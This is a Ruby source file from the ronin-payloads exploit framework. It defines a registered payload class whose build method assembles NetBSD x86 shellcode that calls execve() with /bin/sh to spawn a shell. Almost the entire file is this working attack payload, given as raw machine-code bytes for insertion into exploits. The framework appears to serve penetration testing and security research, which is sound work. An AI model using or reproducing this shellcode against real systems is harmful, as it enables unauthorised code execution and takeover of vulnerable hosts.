# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2025 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module NetBSD
        module X86
          #
          # NetBSD x86 shellcode that calls `execve()` with `/bin/sh`.
          #
          class ExecShell < ExecShellPayload

            register 'shellcode/netbsd/x86/exec_shell'

            arch :x86
            os :netbsd

            author 'humble'

            summary 'NetBSD x86 execve() shellcode'
            description <<~DESC
              NetBSD x86 shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-108.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\xeb\x23" \
                         "\x5e" \
                         "\x8d\x1e" \
                         "\x89\x5e\x0b" \
                         "\x31\xd2" \
                         "\x89\x56\x07" \
                         "\x89\x56\x0f" \
                         "\x89\x56\x14" \
                         "\x88\x56\x19" \
                         "\x31\xc0" \
                         "\xb0\x3b" \
                         "\x8d\x4e\x0b" \
                         "\x89\xca" \
                         "\x52" \
                         "\x51" \
                         "\x53" \
                         "\x50" \
                         "\xeb\x18" \
                         "\xe8\xd8\xff\xff\xff" \
                         "/bin/sh" \
                         "\x01\x01\x01\x01" \
                         "\x02\x02\x02\x02" \
                         "\x03\x03\x03\x03" \
                         "\x9a\x04\x04\x04\x04\x07\x04"
            end

          end
        end
      end
    end
  end
end
